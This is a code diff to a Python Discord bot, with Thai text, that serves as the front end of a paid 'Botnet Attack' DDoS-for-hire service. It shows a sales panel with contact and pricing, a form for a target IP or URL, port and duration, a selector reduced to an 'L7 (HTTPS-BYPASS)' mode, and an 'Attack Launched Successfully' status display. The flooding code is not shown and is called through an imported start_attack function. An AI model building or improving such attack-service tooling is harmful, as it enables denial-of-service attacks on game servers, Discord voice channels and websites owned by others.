@@ -7,16 +7,11 @@ from config import (
 )
 
 
-# ═══════════════════════════════════════════
-# Panel
-# ═══════════════════════════════════════════
 def build_panel() -> ui.LayoutView:
     view = ui.LayoutView(timeout=None)
-    c = ui.Container()   # ← ไม่ใส่ accent_color
+    c = ui.Container()
 
-    c.add_item(ui.TextDisplay(
-        f"# {EMOJI_HEADER} **Botnet Attack**"
-    ))
+    c.add_item(ui.TextDisplay(f"# {EMOJI_HEADER} **Botnet Attack**"))
     c.add_item(ui.TextDisplay(
         f"{EMOJI_CONTACT} **สนใจติดต่อ Tk มาเลยค้าบ {PRICE_TEXT}**"
     ))
@@ -33,9 +28,7 @@ def build_panel() -> ui.LayoutView:
         f"เซิร์ฟ มายคราฟ\n"
         f"ห้องเสียงDiscord"
     ))
-    c.add_item(ui.ActionRow().add_item(
-        PanelButton()
-    ))
+    c.add_item(ui.ActionRow().add_item(PanelButton()))
     view.add_item(c)
     return view
 
@@ -43,7 +36,7 @@ def build_panel() -> ui.LayoutView:
 class PanelButton(ui.Button):
     def __init__(self):
         super().__init__(
-            label="ขอ Device",
+            label="",
             style=discord.ButtonStyle.secondary,
             custom_id="panel_request",
             emoji=EMOJI_BUTTON,
@@ -54,9 +47,6 @@ class PanelButton(ui.Button):
         await open_attack_modal(interaction)
 
 
-# ═══════════════════════════════════════════
-# Attack Modal
-# ═══════════════════════════════════════════
 class AttackModal(ui.Modal, title="Botnet Attack"):
     target = ui.TextInput(
         label="Target IP / URL",
@@ -79,13 +69,10 @@ class AttackModal(ui.Modal, title="Botnet Attack"):
         await handle_attack_submit(interaction, self)
 
 
-# ═══════════════════════════════════════════
-# Mode select
-# ═══════════════════════════════════════════
 def build_mode_select(user_id: int, target: str, port: int,
                       duration: int) -> ui.LayoutView:
     view = ui.LayoutView(timeout=300)
-    c = ui.Container()   # ← ไม่มีสี
+    c = ui.Container()
 
     c.add_item(ui.TextDisplay("# เลือกโหมดการยิง"))
     c.add_item(ui.TextDisplay(
@@ -105,11 +92,7 @@ def build_mode_select(user_id: int, target: str, port: int,
 class ModeSelect(ui.Select):
     def __init__(self, user_id: int, target: str, port: int, duration: int):
         options = [
-            discord.SelectOption(label="Minecraft", value="minecraft", emoji="⛏️"),
-            discord.SelectOption(label="Free Fire", value="freefire",  emoji="🔥"),
-            discord.SelectOption(label="Discord",   value="discord",   emoji="🎧"),
-            discord.SelectOption(label="L4",  value="l4",        emoji="🌍"),
-            discord.SelectOption(label="L7", value="l7",        emoji="🌐"),
+            discord.SelectOption(label="L7 (HTTPS-BYPASS)", value="l7", emoji="🌐"),
         ]
         super().__init__(placeholder="เลือกโหมด", options=options,
                          custom_id="mode_select")
@@ -120,23 +103,22 @@ class ModeSelect(ui.Select):
 
     async def callback(self, interaction: discord.Interaction):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message("ไม่ใช่คำสั่งของมึง", ephemeral=True)
+            await interaction.response.send_message(
+                "ไม่ใช่คำสั่งของมึง", ephemeral=True
+            )
             return
         from bot import start_attack
         await start_attack(interaction, self.values[0], self.target,
                            self.port, self.duration)
 
 
-# ═══════════════════════════════════════════
-# Attack running — terminal style (ตามภาพ 2)
-# ═══════════════════════════════════════════
 def build_attack_running(target: str, port: int, mode: str,
                          time_left: int, total: int,
                          speed: str, hits: int = 0) -> ui.LayoutView:
     view = ui.LayoutView(timeout=None)
     c = ui.Container()
 
-    c.add_item(ui.TextDisplay("# Ddos ATTACK"))
+    c.add_item(ui.TextDisplay("# Attack Launched Successfully"))
     c.add_item(ui.TextDisplay(
         f"```\n"
         f"[+] Target    : {target}\n"
